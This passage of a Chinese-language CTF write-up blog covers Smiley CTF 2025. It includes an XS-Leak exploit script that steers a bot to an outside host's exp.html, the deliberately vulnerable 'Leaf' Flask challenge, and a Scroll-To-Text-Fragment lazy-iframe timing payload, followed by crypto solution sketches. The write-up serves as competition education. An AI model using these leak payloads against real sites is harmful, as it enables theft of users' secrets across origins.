class="built_in">open</span>(<span class="string">&#x27;payload.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    origin_payload = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_file</span>(<span class="params">num_range</span>):</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> num_range:</span><br><span class="line">        payload += <span class="string">f&quot;&lt;a href=&#x27;http://127.0.0.1:7382<span class="subst">&#123;urls[i]&#125;</span>&#x27;&gt;&lt;/a&gt;&quot;</span></span><br><span class="line">    payload = origin_payload.replace(<span class="string">&#x27;WAITREPLACEHEHE&#x27;</span>, payload)</span><br><span class="line">    <span class="comment"># print(payload)</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;exp.html&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(payload)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># aHR0cDovLzE3Mi4xNy4wLjEvZXhwLmh0bWwK</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>web = req.get(&#x27;http://172.17.0.2:7382/bot?address=aHR0cDovLzE3Mi4xNy4wLjEvZXhwLmh0bWwK&#x27;)</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>web.text</span></span><br><span class="line"><span class="string">&#x27;\x00\x00\x00ÿ&#x27;</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>web.text.encode().hex() # hit</span></span><br><span class="line"><span class="string">&#x27;000000c3bf&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    web = req.get(<span class="string">f&#x27;<span class="subst">&#123;target_url&#125;</span>/bot?address=aHR0cDovLzQ1Ljc3LjIwLjI1NTo2MDU0L2V4cC5odG1sCg==&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(web.text.encode().<span class="built_in">hex</span>())</span><br><span class="line">    <span class="keyword">return</span> web.text.encode().<span class="built_in">hex</span>() == <span class="string">&#x27;c3bf0000c3bf&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gen_file(range(0, 1))</span></span><br><span class="line">gen_file(<span class="built_in">range</span>(<span class="number">0</span>, <span class="number">500</span>))</span><br><span class="line">test()</span><br><span class="line">gen_file(<span class="built_in">range</span>(<span class="number">500</span>, <span class="number">1000</span>))</span><br><span class="line">test()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l = -<span class="number">1</span></span><br><span class="line">r = <span class="number">999</span></span><br><span class="line"><span class="keyword">while</span> l+<span class="number">1</span>&lt;r:</span><br><span class="line">    mid = (l+r)//<span class="number">2</span></span><br><span class="line">    gen_file(<span class="built_in">range</span>(l+<span class="number">1</span>, mid+<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">if</span> test():</span><br><span class="line">        r = mid</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        l = mid</span><br><span class="line">    <span class="built_in">print</span>(l, r, urls[r])</span><br><span class="line"></span><br><span class="line">web = req.get(target_url+<span class="string">&#x27;/gamble?flag=&#x27;</span>+urls[r][<span class="number">1</span>:])</span><br><span class="line"><span class="built_in">print</span>(web.text)</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/B1yhkL-4le.png" alt="image">  </p>
+<h3 id="Leaf"><a href="#Leaf" class="headerlink" title="Leaf"></a>Leaf</h3><p><strong>server.py</strong>  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response, render_template_string, redirect</span><br><span class="line"><span class="keyword">import</span> os, base64, sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">PORT = <span class="number">8800</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag start with d0nt, charset is string.ascii_letters +  string.digits + &#x27;&#123;&#125;_.-&#x27;</span></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read().strip()</span><br><span class="line"><span class="built_in">print</span>(flag.replace(<span class="string">&quot;.;,;.&#123;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"></span><br><span class="line">template = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Pure Leaf&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;style nonce=&quot;&#123;&#123; nonce &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">        body &#123;</span></span><br><span class="line"><span class="string">            background-color: #21d375;</span></span><br><span class="line"><span class="string">            font-size: 100px;</span></span><br><span class="line"><span class="string">            color: #fff;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            height: 100vh;</span></span><br><span class="line"><span class="string">            margin: 0;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            text-align: center;</span></span><br><span class="line"><span class="string">            justify-content: center;</span></span><br><span class="line"><span class="string">            align-items: center;            </span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;head&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">    &#123;% if flag %&#125;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;leaf&quot;&gt;&#123;&#123; flag &#125;&#125;&lt;/div&gt;</span></span><br><span class="line"><span class="string">    &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">    &#123;% if leaves %&#125;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;leaf&quot;&gt;&#123;&#123; leaves | safe&#125;&#125;&lt;/div&gt;</span></span><br><span class="line"><span class="string">    &#123;% else %&#125;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;leaf&quot;&gt;I love leaves&lt;/div&gt;</span></span><br><span class="line"><span class="string">    &#123;% endif %&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;script nonce=&quot;&#123;&#123; nonce &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">        Array.from(document.getElementsByClassName(&#x27;leaf&#x27;)).forEach(function(element) &#123;</span></span><br><span class="line"><span class="string">            let text = element.innerText;</span></span><br><span class="line"><span class="string">            element.innerHTML = &#x27;&#x27;;</span></span><br><span class="line"><span class="string">            // our newest technology prevents you from copying the text</span></span><br><span class="line"><span class="string">            // so we have to create a new element for each character</span></span><br><span class="line"><span class="string">            // and append it to the element</span></span><br><span class="line"><span class="string">            // this is a very bad idea, but it works</span></span><br><span class="line"><span class="string">            // and we are not using innerHTML, so we are safe from XSS</span></span><br><span class="line"><span class="string">            for (let i = 0; i &lt; text.length; i++) &#123;</span></span><br><span class="line"><span class="string">                let charElem = document.createElement(&#x27;span&#x27;);</span></span><br><span class="line"><span class="string">                charElem.innerText = text[i];</span></span><br><span class="line"><span class="string">                element.appendChild(charElem);</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    nonce = base64.b64encode(os.urandom(<span class="number">32</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    flag_cookie = request.cookies.get(<span class="string">&#x27;flag&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    leaves = request.args.get(<span class="string">&#x27;leaf&#x27;</span>, <span class="string">&#x27;Leaf&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    rendered = render_template_string(</span><br><span class="line">        template,</span><br><span class="line">        nonce=nonce,</span><br><span class="line">        flag=flag_cookie,</span><br><span class="line">        leaves=leaves,</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    response = make_response(rendered)</span><br><span class="line"></span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Security-Policy&#x27;</span>] = (</span><br><span class="line">        <span class="string">f&quot;default-src &#x27;none&#x27;; script-src &#x27;nonce-<span class="subst">&#123;nonce&#125;</span>&#x27;; style-src &#x27;nonce-<span class="subst">&#123;nonce&#125;</span>&#x27;; &quot;</span></span><br><span class="line">        <span class="string">&quot;base-uri &#x27;none&#x27;; frame-ancestors &#x27;none&#x27;;&quot;</span></span><br><span class="line">    )</span><br><span class="line">    response.headers[<span class="string">&#x27;Referrer-Policy&#x27;</span>] = <span class="string">&#x27;no-referrer&#x27;</span></span><br><span class="line">    response.headers[<span class="string">&#x27;X-Content-Type-Options&#x27;</span>] = <span class="string">&#x27;nosniff&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/bot&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bot</span>():</span><br><span class="line">    data = request.args.get(<span class="string">&#x27;leaf&#x27;</span>, <span class="string">&#x27;🍃&#x27;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data = base64.b64decode(data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    url = <span class="string">f&quot;http://127.0.0.1:8800/?leaf=<span class="subst">&#123;data&#125;</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Visiting &#x27;</span> + url, file=sys.stderr)</span><br><span class="line">    </span><br><span class="line">    options = Options()</span><br><span class="line">    options.add_argument(<span class="string">&quot;--headless&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--no-sandbox&quot;</span>)</span><br><span class="line">    driver = webdriver.Chrome(options=options)</span><br><span class="line">    driver.get(<span class="string">f&#x27;http://127.0.0.1:8800/void&#x27;</span>)</span><br><span class="line">    driver.add_cookie(&#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;value&#x27;</span>: flag.replace(<span class="string">&quot;.;,;.&#123;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>),</span><br><span class="line">        <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[-] Visiting URL&#x27;</span>, url, file=sys.stderr)</span><br><span class="line"></span><br><span class="line">    driver.get(url)</span><br><span class="line">    driver.implicitly_wait(<span class="number">5</span>)</span><br><span class="line">    driver.quit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[-] Done visiting URL&#x27;</span>, url, file=sys.stderr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">f&#x27;http://127.0.0.1:8800/?leaf=Yayayayay I checked ur leaf its great&#x27;</span>, code=<span class="number">302</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(port=PORT, debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>一樣是XSLeak，但這我是真想不到 XD  </p>
+<p>兩個 features:  </p>
+<ol>
+<li><p>STTF(Scroll To Text Fragment): <code>#:~:text=whale</code> 會自動鎖定並滑動到頁面第一次完整出現的位置<br>譬如說  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">    whale120</span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>不會被匹配到<br>但  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>what/span&gt;<span class="tag">&lt;<span class="name">span</span>&gt;</span>le<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">a</span>&gt;</span>wha<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">a</span>&gt;</span>le<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>這兩個都會被匹配到(先出現者優先，所以會 tag 到 span 那排)<br>詳情和發展歷史：<a target="_blank" rel="noopener" href="https://github.com/WICG/scroll-to-text-fragment">https://github.com/WICG/scroll-to-text-fragment</a>  </p>
+</li>
+<li><p>lazy loading: 在需要資源時才引入，會大量拖慢速度</p>
+</li>
+</ol>
+<p>最後就可以構出這樣的 payload 進行 timing attack  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;<span class="tag">&lt;/<span class="name">div</span>&gt;</span>&quot; + &quot;<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">loading</span>=<span class="string">lazy</span> <span class="attr">src</span>=<span class="string">/</span> <span class="attr">width</span>=<span class="string">1</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>&quot;* 400 +&quot;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot; *60 + f&quot;<span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;leaf&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span>#:~:text=&#123;leaf&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>賽後也有看到選手透過 <code>&lt;details&gt;</code> tag 在 STTF 觸發時可以展開 + 他算在 window.opener.length 的 feature 進行 xsleak ：<br>原始網頁開啟一個 counter &#x3D;&gt; meta 導向 payload 頁面（含 details tag） &#x3D;&gt; counter 數 opener 內嵌長度  </p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>QwQ 有點太忙沒空寫 exploit，先貼個之後補</p>
+<h3 id="LCGs-are-SBGs"><a href="#LCGs-are-SBGs" class="headerlink" title="LCGs are SBGs"></a>LCGs are SBGs</h3><p>一個在複數平面上的 Truncated LCG Problem<br><a target="_blank" rel="noopener" href="https://jsur.in/posts/2020-09-20-downunderctf-2020-writeups#lsb-msb-calculation-game">https://jsur.in/posts/2020-09-20-downunderctf-2020-writeups#lsb-msb-calculation-game</a><br>唯一的不同就是 LLL 矩陣構造，跟我今年在 thjcc 出的 lIne 變換方法其實很像 XD<br>$$<br>L &#x3D;<br>\begin{bmatrix}<br>M &amp; 0 &amp; 0 &amp; 0 &amp; \cdots &amp; 0 \<br>0 &amp; M &amp; 0 &amp; 0 &amp; \cdots &amp; 0 \<br>a_{real} &amp; -a_{imag} &amp; -1 &amp; 0 &amp; \cdots &amp; 0 \<br>a_{imag} &amp; a_{real} &amp; -1 &amp; 0 &amp; \cdots &amp; 0 \<br>a^2_{real} &amp; -a^2_{imag} &amp; 0 &amp; -1 &amp; \cdots &amp; 0 \<br>\vdots &amp; \vdots &amp; \ddots &amp; \ddots &amp; \vdots \<br>a^{k-1}<em>{imag} &amp; a^{k-1}</em>{real} &amp; 0 &amp; 0 &amp; \cdots &amp; -1<br>\end{bmatrix}<br>$$</p>
+<p>其他參考：<a target="_blank" rel="noopener" href="https://gist.github.com/maple3142/c7c31d2e5893d524e71eb5e12b0278f0">https://gist.github.com/maple3142/c7c31d2e5893d524e71eb5e12b0278f0</a>  </p>
+<h3 id="a-special-place-in-reality"><a href="#a-special-place-in-reality" class="headerlink" title="a special place in reality"></a>a special place in reality</h3><p><strong>chall.py</strong><br>一個很有巧思的小題目 XD，挺可惜賽後才去看  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">FLAG = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&quot;Yes? &quot;</span>) == <span class="string">&quot;yes&quot;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Length: &quot;</span>))</span><br><span class="line">            <span class="keyword">if</span> x &lt;= <span class="built_in">len</span>(FLAG) * <span class="number">40</span>:</span><br><span class="line">                p = getPrime(x)</span><br><span class="line">            <span class="keyword">elif</span> x &lt;= <span class="number">10000</span>: <span class="comment"># no dos pls</span></span><br><span class="line">                p = <span class="number">256</span></span><br><span class="line">            n = p*p</span><br><span class="line"></span><br><span class="line">            flag = FLAG + <span class="string">&quot;a&quot;</span> * (<span class="number">1</span> + math.ceil(x/<span class="number">8</span>))</span><br><span class="line">            flag = bytes_to_long(flag.encode())</span><br><span class="line">            flag = flag - flag % p</span><br><span class="line"></span><br><span class="line">            c = <span class="built_in">pow</span>(flag, <span class="number">65537</span>, n)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;p multiple length:&quot;</span>, <span class="built_in">len</span>(<span class="built_in">bin</span>(flag//p)) - <span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;p multiple 1 bits:&quot;</span>, <span class="built_in">bin</span>(flag//p).count(<span class="string">&quot;1&quot;</span>))</span><br><span class="line">            <span class="built_in">print</span>(c, <span class="number">65537</span>, n)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;invalid input&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;exiting...&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>就…如程式碼<br><del>但很容易被誤導因為 c 從頭到尾都不用被使用</del><br>小觀察：  </p>
+<ol>
+<li>輸入的 x &gt; 10000 時 p 的值換都不會換，等於可以取得多筆 <code>FLAG+&quot;a&quot;*n</code> % p 再除 p 的 popcount  </li>
+<li>$n<em>p + y_1$ 帶入的 popcount 值與它 $n</em>p + y_2$ 的相減會等同 $y_1$, $y_2$ 帶入的結果（想像 p 進制下的操作）</li>
+</ol>
+<p>最後可以利用相減的序列去進行 Oracle 猜解，比對出來一樣就可以取得 FLAG mod p 的值，最後取得多一點做 CRT 就好  </p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Teemo%E2%80%99s-Secret"><span class="toc-number">2.1.</span> <span class="toc-text">Teemo’s Secret</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Leaf"><span class="toc-number">2.2.</span> <span class="toc-text">Leaf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LCGs-are-SBGs"><span class="toc-number">3.1.</span> <span class="toc-text">LCGs are SBGs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#a-special-place-in-reality"><span class="toc-number">3.2.</span> <span class="toc-text">a special place in reality</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/06/19/2025-smiley-ctf/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/06/19/2025-smiley-ctf/&text=Smiley CTF 2025 Note"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/06/19/2025-smiley-ctf/&title=Smiley CTF 2025 Note"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/06/19/2025-smiley-ctf/&is_video=false&description=Smiley CTF 2025 Note"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Smiley CTF 2025 Note&body=Check out this article: http://wha13.github.io/2025/06/19/2025-smiley-ctf/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/06/19/2025-smiley-ctf/&title=Smiley CTF 2025 Note"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/06/19/2025-smiley-ctf/&title=Smiley CTF 2025 Note"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/06/19/2025-smiley-ctf/&title=Smiley CTF 2025 Note"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/06/19/2025-smiley-ctf/&title=Smiley CTF 2025 Note"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/06/19/2025-smiley-ctf/&name=Smiley CTF 2025 Note&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/06/19/2025-smiley-ctf/&t=Smiley CTF 2025 Note"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
